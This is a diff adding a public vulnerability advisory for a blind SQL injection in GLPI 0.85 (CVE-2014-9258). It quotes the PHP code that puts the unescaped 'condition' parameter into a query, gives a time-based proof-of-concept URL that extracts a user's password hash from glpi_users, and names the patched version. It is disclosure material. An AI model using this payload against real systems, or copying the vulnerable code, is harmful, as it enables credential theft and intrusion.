@@ -1,0 +1,40 @@
+# Exploit Title: GLPI 0.85 Blind SQL Injection
+# Date: 28-11-2014
+# Exploit Author: Kacper Szurek - http://security.szurek.pl/ http://twitter.com/KacperSzurek
+# Software Link: https://forge.indepnet.net/attachments/download/1899/glpi-0.85.tar.gz
+# CVE: CVE-2014-9258
+# Category: webapps
+  
+1. Description
+  
+$_GET['condition'] is not escaped correctly.
+
+File: ajax\getDropdownValue.php
+if (isset($_GET['condition']) && !empty($_GET['condition'])) {
+   $_GET['condition'] = rawurldecode(stripslashes($_GET['condition']));
+}
+if (isset($_GET['condition']) && ($_GET['condition'] != '')) {
+   $where .= " AND ".$_GET['condition']." ";
+}
+$query = "SELECT `$table`.* $addselect
+         FROM `$table`
+         $addjoin
+         $where
+         ORDER BY $add_order `$table`.`completename`
+         $LIMIT";
+
+if ($result = $DB->query($query)) {
+
+}
+
+http://security.szurek.pl/glpi-085-blind-sql-injection.html
+
+2. Proof of Concept
+
+http://glpi-url/ajax/getDropdownValue.php?itemtype=group&condition=1 AND id = (SELECT IF(substr(password,1,1) = CHAR(36), SLEEP(5), 0) FROM `glpi_users` WHERE ID = 2)
+
+3. Solution:
+  
+Update to version 0.85.1
+http://www.glpi-project.org/spip.php?page=annonce&id_breve=334&lang=en
+https://forge.indepnet.net/attachments/download/1928/glpi-0.85.1.tar.gz
